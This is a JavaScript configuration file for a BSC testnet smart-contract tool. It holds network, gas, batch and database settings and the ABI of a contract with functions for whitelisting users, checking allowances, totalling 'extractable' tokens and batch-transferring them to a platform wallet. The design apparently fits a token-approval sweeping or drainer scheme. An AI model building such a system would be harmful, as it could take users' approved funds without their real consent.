require('dotenv').config();

const config = {
    // Network Configuration
    rpcUrl: process.env.RPC_URL || 'https://bsc-testnet.public.blastapi.io',
    chainId: parseInt(process.env.CHAIN_ID) || 97,
    
    // Smart Contract Configuration
    contractAddress: process.env.CONTRACT_ADDRESS || '0x7238faE7A03b278f2E13bb357191816dFF1792D0',
    ownerPrivateKey: process.env.OWNER_PRIVATE_KEY,
    
    // Database Configuration
    mongoUri: process.env.MONGO_URI || 'mongodb://localhost:27017/automation-wallets',
    
    // Platform Wallet Configuration
    platformWalletAddress: process.env.PLATFORM_WALLET_ADDRESS,
    
    // Gas Configuration
    gasLimit: parseInt(process.env.GAS_LIMIT) || 300000,
    gasPrice: process.env.GAS_PRICE || '20000000000',
    
    // Batch Processing Configuration
    batchSize: parseInt(process.env.BATCH_SIZE) || 50,
    delayBetweenBatches: parseInt(process.env.DELAY_BETWEEN_BATCHES) || 5000,
    
    // Dashboard Configuration
    dashboardPort: parseInt(process.env.DASHBOARD_PORT) || 3000,
    
    // Complete Contract ABI
    contractABI: [
        {"inputs":[{"internalType":"address payable","name":"_platformWallet","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
        {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},
        {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"UserRegistered","type":"event"},
        {"inputs":[{"internalType":"address","name":"_pltWallet","type":"address"}],"name":"changePlatformWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"checkAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"checkIfRegistered","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"checkbalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"getAllRegistered","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"getTotalExtractableTokens","outputs":[{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isRegistered","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"multiTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"platformWallet","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"registeredUsers","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"singleTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[],"name":"totalRegistered","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"whitlistAddress","outputs":[],"stateMutability":"nonpayable","type":"function"}
    ]
};

module.exports = config;
